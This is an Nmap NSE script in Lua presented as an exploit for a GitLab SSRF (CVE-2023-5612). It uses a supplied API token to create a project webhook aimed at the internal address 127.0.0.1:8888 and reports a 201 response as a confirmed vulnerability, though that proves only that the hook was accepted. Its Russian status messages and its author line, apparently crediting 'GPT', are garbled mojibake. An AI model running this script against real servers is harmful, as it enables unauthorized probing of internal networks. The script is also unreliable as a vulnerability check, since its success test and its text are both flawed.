local http = require "http"
local json = require "json"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
Exploits CVE-2023-5612 - GitLab SSRF via webhook creation.
]]

author = "–¢–≤–æ–π –±—Ä–∞—Ç GPT"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

portrule = shortport.http

action = function(host, port)
  local token = stdnse.get_script_args("gitlab.token")
  if not token then
    return "‚ùå –¢–æ–∫–µ–Ω –Ω–µ —É–∫–∞–∑–∞–Ω: --script-args gitlab.token=TOKEN"
  end

  local path = "/api/v4/projects/1/hooks"
  local target_url = "http://127.0.0.1:8888"
  local payload = json.encode({ url = target_url })

  local request_opts = {
    header = {
      ["Content-Type"] = "application/json",
      ["PRIVATE-TOKEN"] = token
    },
    content = payload
  }

  stdnse.print_debug(1, "=== GitLab SSRF (CVE-2023-5612) –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è ===")
  stdnse.print_debug(1, "üì° –¶–µ–ª—å: http://%s:%s%s", host.ip, port.number, path)
  stdnse.print_debug(1, "üì¶ Payload: %s", payload)

  local response = http.post(host, port, path, request_opts)

  if not response then
    return "‚ùå –û—à–∏–±–∫–∞: –Ω–µ—Ç –æ—Ç–≤–µ—Ç–∞ –æ—Ç GitLab"
  end

  if response.status == 201 then
    return "‚úÖ –£—è–∑–≤–∏–º–æ—Å—Ç—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞! Webhook –¥–æ–±–∞–≤–ª–µ–Ω: " .. target_url
  elseif response.status == 401 then
    return "üîê –¢–æ–∫–µ–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –∏–ª–∏ –∏—Å—Ç—ë–∫ (401)"
  elseif response.status == 404 then
    return "‚ùì –ü—Ä–æ–µ–∫—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω (ID=1). –ü—Ä–æ–≤–µ—Ä—å –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å project_id"
  else
    return string.format("üì• HTTP —Å—Ç–∞—Ç—É—Å: %d\nüì• –û—Ç–≤–µ—Ç: %s", response.status, response.body)
  end
end
